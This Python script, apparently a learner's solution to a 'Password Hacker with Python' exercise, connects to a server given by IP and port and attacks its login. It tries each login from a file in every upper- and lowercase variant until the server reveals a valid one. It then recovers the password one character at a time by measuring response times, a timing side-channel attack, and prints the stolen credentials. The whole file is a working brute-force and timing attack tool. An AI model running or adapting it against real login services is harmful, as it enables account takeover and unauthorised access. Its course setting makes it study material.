import itertools
import json
import sys
import socket
from time import time


def words_filter(list_w):
    list_words = []
    for password in list_w:

        if not password.isdigit():
            list_words.append(
                map(lambda x: ''.join(x),
                    itertools.product(*([letter.lower(), letter.upper()] for letter in password))))
        else:
            list_words.append([password])

    for words in list_words:
        for word in words:
            yield word


#########################################

args = sys.argv
IP_address = args[1]
port = int(args[2])

list_logins = []

with open('C:/Users/wwwbe/PycharmProjects/Password Hacker with Python/Password Hacker with '
          'Python/task/hacking/logins.txt', 'r') as file:
    for i in file:
        temp = i.replace('\n', '')
        list_logins.append(temp)

gen_logins = words_filter(list_logins)

# working with a socket as a context manager
with socket.socket() as client_socket:
    hostname = IP_address
    address = (hostname, port)
    client_socket.connect(address)

    for login in gen_logins:
        json_str = json.dumps({"login": login, "password": 'password'})

        message_sending = json_str
        message_sending = message_sending.encode()
        client_socket.send(message_sending)
        response = client_socket.recv(1024)
        result = json.loads(response.decode())

        if result["result"] == "Wrong password!":
            login_final = login
            break

    final_pass = ""
    max_time_character = 0
    character = ""
    while True:
        for passw in itertools.chain(range(65, 91), range(97, 123), range(48, 58)):

            json_str = json.dumps({"login": login_final, "password": final_pass + chr(passw)})
            message_sending = json_str
            message_sending = message_sending.encode()
            client_socket.send(message_sending)
            start = time()
            response = client_socket.recv(1024)
            end = time()
            result = response.decode()
            time_check = end - start

            if result == "{\"result\": \"Connection success!\"}":
                temp = json.loads(json_str)
                json_result = json.dumps(temp, indent=4)
                print(json_result)
                break

            if time_check > max_time_character:
                character = chr(passw)
                max_time_character = time_check

        final_pass += character
        character = ""
        max_time_character = 0
        if result == "{\"result\": \"Connection success!\"}":
            break
